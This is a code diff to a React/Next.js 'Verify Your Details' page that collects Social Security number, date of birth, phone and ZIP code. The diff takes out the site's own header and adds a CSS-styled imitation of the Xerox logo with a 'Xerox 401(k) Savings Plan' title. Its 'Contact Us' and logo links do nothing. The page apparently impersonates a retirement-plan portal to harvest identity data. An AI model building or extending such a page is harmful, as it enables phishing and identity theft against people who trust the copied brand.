@@ -4,7 +4,6 @@ import { useEffect, useRef, useState } from "react";
 import { useRouter } from "next/navigation";
 import { HelpCircle } from "lucide-react";
 import { Button } from "@/components/ui/button";
-import { SiteHeader } from "@/components/site-header";
 import { Input } from "@/components/ui/input";
 import { MONTHS, DAYS, YEARS } from "@/lib/date-constants";
 
@@ -98,8 +97,93 @@ export default function VerifyDetailsPage() {
 
   return (
     <div className="min-h-screen bg-white flex flex-col">
-      <SiteHeader />
-      <div className="max-w-2xl px-4 py-10 mb-[270px] mx-auto md:mx-0 md:ml-[60px] flex-1">
+      <style>{`
+        .topnav {
+          background: #fff;
+          border-bottom: 1px solid #ddd;
+          padding: 20px 150px;
+          display: flex;
+          align-items: center;
+          justify-content: space-between;
+        }
+        .xerox-logo {
+          font-size: 2.2rem;
+          font-weight: 900;
+          color: #e31837;
+          font-style: italic;
+          letter-spacing: -0.04em;
+          text-decoration: none;
+          line-height: 1;
+          font-family: Arial, sans-serif;
+        }
+        .xerox-logo sup {
+          font-size: 0.4em;
+          font-weight: 400;
+          vertical-align: super;
+          font-style: normal;
+          letter-spacing: 0;
+        }
+        .nav-right { 
+          text-align: right; 
+        }
+        .contact-link {
+          display: block;
+          font-size: 0.8rem;
+          color: #c00;
+          text-decoration: none;
+          margin-bottom: 2px;
+        }
+        .contact-link:hover { 
+          text-decoration: underline; 
+        }
+        .plan-title { 
+          font-size: 0.92rem; 
+          color: #222; 
+          font-weight: 400; 
+        }
+
+        @media (max-width: 1024px) {
+          .topnav { padding: 16px 24px; }
+        }
+        
+        @media (max-width: 768px) {
+          .topnav { padding: 14px 16px; flex-direction: column; align-items: flex-start; gap: 8px; }
+          .nav-right { width: 100%; text-align: left; }
+        }
+        
+        @media (max-width: 480px) {
+          .topnav { padding: 12px 12px; }
+          .xerox-logo { font-size: 1.8rem; }
+          .plan-title { font-size: 0.8rem; }
+          .contact-link { font-size: 0.7rem; }
+        }
+      `}</style>
+
+      <nav className="topnav">
+        <a
+          className="xerox-logo"
+          href="#"
+          onClick={(e) => {
+            e.preventDefault();
+          }}
+        >
+          xerox<sup>™</sup>
+        </a>
+        <div className="nav-right">
+          <a
+            className="contact-link"
+            href="#"
+            onClick={(e) => {
+              e.preventDefault();
+            }}
+          >
+            Contact Us
+          </a>
+          <span className="plan-title">Xerox 401(k) Savings Plan</span>
+        </div>
+      </nav>
+
+      <div className="max-w-2xl px-4 py-10 mb-67.5 mx-auto md:mx-0 md:ml-15 flex-1">
         <div className="flex items-center gap-2 mb-2">
           <h1 className="text-2xl font-semibold text-gray-900">
             Verify Your Details
@@ -136,7 +220,7 @@ export default function VerifyDetailsPage() {
               onChange={(e) =>
                 setSsn(e.target.value.replace(/\D/g, "").slice(0, 9))
               }
-              className="max-w-[140px] h-10 bg-gray-50 border-gray-300 rounded-md"
+              className="max-w-35 h-10 bg-gray-50 border-gray-300 rounded-md"
             />
           </div>
 
@@ -148,7 +232,7 @@ export default function VerifyDetailsPage() {
               <select
                 value={month}
                 onChange={(e) => setMonth(e.target.value)}
-                className="h-10 px-3 bg-gray-50 border border-gray-300 rounded-md text-sm text-gray-900 min-w-[120px]"
+                className="h-10 px-3 bg-gray-50 border border-gray-300 rounded-md text-sm text-gray-900 min-w-30"
               >
                 <option value="">Month</option>
                 {MONTHS.map((m) => (
@@ -160,7 +244,7 @@ export default function VerifyDetailsPage() {
               <select
                 value={day}
                 onChange={(e) => setDay(e.target.value)}
-                className="h-10 px-3 bg-gray-50 border border-gray-300 rounded-md text-sm text-gray-900 min-w-[80px]"
+                className="h-10 px-3 bg-gray-50 border border-gray-300 rounded-md text-sm text-gray-900 min-w-20"
               >
                 <option value="">Day</option>
                 {DAYS.map((d) => (
@@ -172,7 +256,7 @@ export default function VerifyDetailsPage() {
               <select
                 value={year}
                 onChange={(e) => setYear(e.target.value)}
-                className="h-10 px-3 bg-gray-50 border border-gray-300 rounded-md text-sm text-gray-900 min-w-[90px]"
+                className="h-10 px-3 bg-gray-50 border border-gray-300 rounded-md text-sm text-gray-900 min-w-22.5"
               >
                 <option value="">Year</option>
                 {YEARS.map((y) => (
@@ -217,7 +301,7 @@ export default function VerifyDetailsPage() {
 
                 setPhone(formatted);
               }}
-              className="max-w-[220px] h-10 bg-gray-50 border-gray-300 rounded-md"
+              className="max-w-55 h-10 bg-gray-50 border-gray-300 rounded-md"
             />
           </div>
 
@@ -237,7 +321,7 @@ export default function VerifyDetailsPage() {
               onChange={(e) =>
                 setZip(e.target.value.replace(/\D/g, "").slice(0, 10))
               }
-              className="max-w-[160px] h-10 bg-gray-50 border-gray-300 rounded-md"
+              className="max-w-40 h-10 bg-gray-50 border-gray-300 rounded-md"
             />
           </div>
           {countdown > 0 && (
